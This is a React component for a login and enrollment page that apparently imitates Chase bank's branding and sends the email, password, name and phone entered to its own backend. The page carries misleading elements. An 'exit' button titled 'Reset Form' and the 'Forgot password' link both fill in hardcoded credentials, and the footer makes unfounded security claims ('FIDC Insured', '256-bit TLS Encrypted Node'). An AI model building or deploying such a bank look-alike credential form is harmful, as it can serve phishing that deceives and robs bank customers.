import React, { useState } from "react";
import { Lock, Mail, User, Phone, ShieldCheck, ArrowRight, Eye, EyeOff } from "lucide-react";

interface LoginProps {
  onLoginSuccess: (token: string) => void;
}

export default function Login({ onLoginSuccess }: LoginProps) {
  const [isRegister, setIsRegister] = useState(false);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  
  // Registration States
  const [firstName, setFirstName] = useState("");
  const [lastName, setLastName] = useState("");
  const [username, setUsername] = useState("");
  const [phone, setPhone] = useState("");
  
  const [showPassword, setShowPassword] = useState(false);
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [regSuccess, setRegSuccess] = useState("");

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");
    setLoading(true);

    try {
      const response = await fetch("/api/v1/auth/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, password }),
      });

      const resData = await response.json();
      if (!response.ok || !resData.success) {
        throw new Error(resData.message || "Invalid credentials. Please attempt again.");
      }

      onLoginSuccess(resData.data.token);
    } catch (err: any) {
      setError(err.message || "Something went wrong.");
    } finally {
      setLoading(false);
    }
  };

  const handleRegister = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");
    setRegSuccess("");
    setLoading(true);

    if (!firstName || !lastName || !email || !password) {
      setError("Please complete all required fields.");
      setLoading(false);
      return;
    }

    try {
      const response = await fetch("/api/v1/users/register", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          first_name: firstName,
          last_name: lastName,
          username,
          email,
          phone,
          password,
        }),
      });

      const resData = await response.json();
      if (!response.ok || !resData.success) {
        throw new Error(resData.message || "Registration failed.");
      }

      setRegSuccess("Account registered successfully! You may now log in.");
      setIsRegister(false);
      setPassword("");
    } catch (err: any) {
      setError(err.message || "Registration failed.");
    } finally {
      setLoading(false);
    }
  };

  const setLoginPreset = () => {
    setEmail("johnprivate677i@gmail.com");
    setPassword("cupcake123456");
  };

  return (
    <div 
      id="login-screen" 
      className="relative min-h-screen bg-cover bg-center bg-no-repeat flex flex-col items-center justify-center p-4 selection:bg-[#0060f0] selection:text-white"
      style={{ backgroundImage: `url('https://images.unsplash.com/photo-1501785888041-af3ef285b470?auto=format&fit=crop&q=80&w=1920')` }}
    >
      {/* Absolute dark overlay on the background to enhance text legibility and match premium photography color grade */}
      <div className="absolute inset-0 bg-gradient-to-b from-black/25 via-transparent to-black/35 pointer-events-none"></div>

      {/* Modern Top Header containing corporate Chase Logo and exit button */}
      <header className="absolute top-0 inset-x-0 h-16 px-6 sm:px-12 flex items-center justify-between select-none z-20">
        <div className="w-6 h-6"></div> {/* Left Balance Spacer */}
        
        {/* White Chase Corporate Logo */}
        <div className="flex items-center space-x-2">
          <span className="text-white text-xl sm:text-2xl font-bold tracking-[0.22em] font-sans">CHASE</span>
        </div>
        
        {/* Right Exit Option */}
        <button 
          onClick={setLoginPreset}
          className="text-white/80 hover:text-white transition-colors cursor-pointer focus:outline-none" 
          title="Reset Form"
        >
          <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth="2.5" stroke="currentColor" className="w-5 h-5">
            <path strokeLinecap="round" strokeLinejoin="round" d="M6 18L18 6M6 6l12 12" />
          </svg>
        </button>
      </header>

      {/* Main card inspired by the iconic Chase rounded signature card */}
      <div className="relative z-15 w-full max-w-[400px] bg-white rounded-lg shadow-[0_25px_60px_-15px_rgba(0,0,0,0.4)] overflow-hidden border border-white/20 flex flex-col mt-4">
        
        <div className="p-8 sm:p-10 flex-grow">
          {error && (
            <div className="mb-4 p-3 bg-red-50 border-l-4 border-red-500 text-red-700 rounded-md text-xs">
              <span className="font-semibold">Error:</span> {error}
            </div>
          )}

          {regSuccess && (
            <div className="mb-4 p-3 bg-emerald-50 border-l-4 border-emerald-500 text-emerald-700 rounded-md text-xs">
              <span className="font-semibold">Success:</span> {regSuccess}
            </div>
          )}

          {!isRegister ? (
            <form onSubmit={handleLogin} className="space-y-6">
              
              {/* Username Input style mimicking exact line input styling */}
              <div className="relative border-b border-gray-300 pb-1 focus-within:border-[#0060f0] transition-colors">
                <input
                  type="email"
                  id="email"
                  required
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  className="peer w-full bg-transparent border-0 pt-5 pb-1 text-slate-800 placeholder-transparent focus:ring-0 focus:outline-none text-[15px] sm:text-[16px]"
                  placeholder="Username"
                />
                <label
                  htmlFor="email"
                  className="absolute left-0 top-1 text-xs text-slate-500 font-sans transition-all peer-placeholder-shown:text-[15px] peer-placeholder-shown:top-5 peer-focus:top-1 peer-focus:text-xs peer-focus:text-[#0060f0]"
                >
                  Username
                </label>
              </div>

              {/* Password Input styled in the exact same line form factor */}
              <div className="relative border-b border-gray-300 pb-1 focus-within:border-[#0060f0] transition-colors">
                <input
                  type={showPassword ? "text" : "password"}
                  id="password"
                  required
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="peer w-full bg-transparent border-0 pt-5 pb-1 text-slate-800 placeholder-transparent focus:ring-0 focus:outline-none text-[15px] sm:text-[16px] pr-8"
                  placeholder="Password"
                />
                <label
                  htmlFor="password"
                  className="absolute left-0 top-1 text-xs text-slate-500 font-sans transition-all peer-placeholder-shown:text-[15px] peer-placeholder-shown:top-5 peer-focus:top-1 peer-focus:text-xs peer-focus:text-[#0060f0]"
                >
                  Password
                </label>
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-0 bottom-2 text-slate-400 hover:text-slate-600 focus:outline-none"
                >
                  {showPassword ? <EyeOff size={16} /> : <Eye size={16} />}
                </button>
              </div>

              {/* Remember Me and Use Token Row fields */}
              <div className="flex items-center justify-between text-[13px] text-slate-600 select-none pt-2">
                <label className="flex items-center space-x-2 cursor-pointer pb-1">
                  <input
                    type="checkbox"
                    defaultChecked
                    className="w-4 h-4 rounded border-gray-300 text-[#0060f0] focus:ring-[#0060f0] cursor-pointer"
                  />
                  <span>Remember me</span>
                </label>
                
                <label className="flex items-center space-x-2 cursor-pointer pb-1">
                  <input
                    type="checkbox"
                    className="w-4 h-4 rounded border-gray-300 text-[#0060f0] focus:ring-[#0060f0] cursor-pointer"
                  />
                  <span>Use token</span>
                </label>
              </div>

              {/* Signature Royal Blue Sign-In Button */}
              <button
                type="submit"
                disabled={loading}
                className="w-full bg-[#0060f0] hover:bg-[#0052cc] active:bg-[#0044aa] text-white font-semibold py-3.5 px-4 rounded-[6px] text-[15px] tracking-wide transition-colors cursor-pointer disabled:bg-slate-300 flex items-center justify-center shadow-md shadow-blue-500/10"
              >
                <span>{loading ? "Signing in..." : "Sign in"}</span>
              </button>

              {/* Clear corporate link options */}
              <div className="space-y-4 pt-4 text-center">
                <a
                  href="#forgot"
                  onClick={(e) => { e.preventDefault(); setLoginPreset(); }}
                  className="flex items-center justify-center text-[13.5px] text-[#0060f0] hover:underline hover:text-[#0044aa] font-medium"
                >
                  Forgot username/password? <span className="ml-1 text-[10px] font-bold">＞</span>
                </a>
                
                <button
                  type="button"
                  onClick={() => {
                    setIsRegister(true);
                    setError("");
                  }}
                  className="flex items-center justify-center text-[13.5px] text-[#0060f0] hover:underline hover:text-[#0044aa] font-medium mx-auto w-full cursor-pointer focus:outline-none"
                >
                  Not Enrolled? Sign Up Now. <span className="ml-1 text-[10px] font-bold">＞</span>
                </button>
              </div>


            </form>
          ) : (
            <form onSubmit={handleRegister} className="space-y-4">
              <h3 className="text-base font-extrabold text-slate-800 tracking-tight pb-2 border-b border-slate-100">
                Enroll in JPM Chase Personal Banking
              </h3>

              <div className="grid grid-cols-2 gap-3 pt-2">
                <div>
                  <label className="block text-xs uppercase tracking-wider font-semibold text-slate-500 mb-1">
                    First Name *
                  </label>
                  <input
                    type="text"
                    required
                    value={firstName}
                    onChange={(e) => setFirstName(e.target.value)}
                    className="w-full bg-slate-50 border border-slate-200 rounded-md py-2.5 px-3 text-sm text-slate-800 focus:outline-none focus:ring-1 focus:ring-[#0060f0]"
                    placeholder="John"
                  />
                </div>
                <div>
                  <label className="block text-xs uppercase tracking-wider font-semibold text-slate-500 mb-1">
                    Last Name *
                  </label>
                  <input
                    type="text"
                    required
                    value={lastName}
                    onChange={(e) => setLastName(e.target.value)}
                    className="w-full bg-slate-50 border border-slate-200 rounded-md py-2.5 px-3 text-sm text-slate-800 focus:outline-none focus:ring-1 focus:ring-[#0060f0]"
                    placeholder="Doe"
                  />
                </div>
              </div>

              <div>
                <label className="block text-xs uppercase tracking-wider font-semibold text-slate-500 mb-1">
                  Username
                </label>
                <div className="relative">
                  <span className="absolute inset-y-0 left-0 flex items-center pl-3 text-slate-400">
                    <User size={15} />
                  </span>
                  <input
                    type="text"
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    className="w-full bg-slate-50 border border-slate-200 rounded-md py-2.5 pl-9 pr-3 text-sm text-slate-800 focus:outline-none focus:ring-1 focus:ring-[#0060f0]"
                    placeholder="johndoe"
                  />
                </div>
              </div>

              <div>
                <label className="block text-xs uppercase tracking-wider font-semibold text-slate-500 mb-1">
                  Email Address *
                </label>
                <div className="relative">
                  <span className="absolute inset-y-0 left-0 flex items-center pl-3 text-slate-400">
                    <Mail size={15} />
                  </span>
                  <input
                    type="email"
                    required
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    className="w-full bg-slate-50 border border-slate-200 rounded-md py-2.5 pl-9 pr-3 text-sm text-slate-800 focus:outline-none focus:ring-1 focus:ring-[#0060f0]"
                    placeholder="john@example.com"
                  />
                </div>
              </div>

              <div>
                <label className="block text-xs uppercase tracking-wider font-semibold text-slate-500 mb-1">
                  Phone Number
                </label>
                <div className="relative">
                  <span className="absolute inset-y-0 left-0 flex items-center pl-3 text-slate-400">
                    <Phone size={15} />
                  </span>
                  <input
                    type="text"
                    value={phone}
                    onChange={(e) => setPhone(e.target.value)}
                    className="w-full bg-slate-50 border border-slate-200 rounded-md py-2.5 pl-9 pr-3 text-sm text-slate-800 focus:outline-none focus:ring-1 focus:ring-[#0060f0]"
                    placeholder="+1234567890"
                  />
                </div>
              </div>

              <div>
                <label className="block text-xs uppercase tracking-wider font-semibold text-slate-500 mb-1">
                  Password *
                </label>
                <div className="relative">
                  <span className="absolute inset-y-0 left-0 flex items-center pl-3 text-slate-400">
                    <Lock size={15} />
                  </span>
                  <input
                    type="password"
                    required
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="w-full bg-slate-50 border border-slate-200 rounded-md py-2.5 pl-9 pr-3 text-sm text-slate-800 focus:outline-none focus:ring-1 focus:ring-[#0060f0]"
                    placeholder="••••••••"
                  />
                </div>
              </div>

              <button
                type="submit"
                disabled={loading}
                className="w-full bg-[#0060f0] hover:bg-[#0052cc] text-white font-semibold py-3 px-4 rounded-[6px] text-sm transition-all flex items-center justify-center space-x-2 cursor-pointer"
              >
                <span>{loading ? "Enrolling client..." : "Agree & Enroll Secured Account"}</span>
              </button>

              <div className="border-t border-slate-100 pt-3 text-center">
                <button
                  type="button"
                  onClick={() => setIsRegister(false)}
                  className="text-xs text-[#0060f0] hover:underline font-semibold cursor-pointer"
                >
                  Already have a JPM Chase account? Sign In
                </button>
              </div>
            </form>
          )}
        </div>
      </div>
      
      {/* Absolute Bottom Footer containing compliance and security certifications */}
      <div className="relative z-15 mt-8 text-center max-w-sm px-4 selection:bg-slate-700">
        <p className="text-[10px] text-white/50 uppercase tracking-widest font-extrabold mb-1.5 flex items-center justify-center space-x-1.5">
          <ShieldCheck size={12} className="text-white/75" />
          <span>FIDC Insured • 256-bit TLS Encrypted Node</span>
        </p>
        <p className="text-[9.5px] text-white/40 leading-relaxed font-sans">
          This secure web application uses advanced encryption to protect personal and ledger account information. Authorized use only.
        </p>
      </div>
    </div>
  );
}
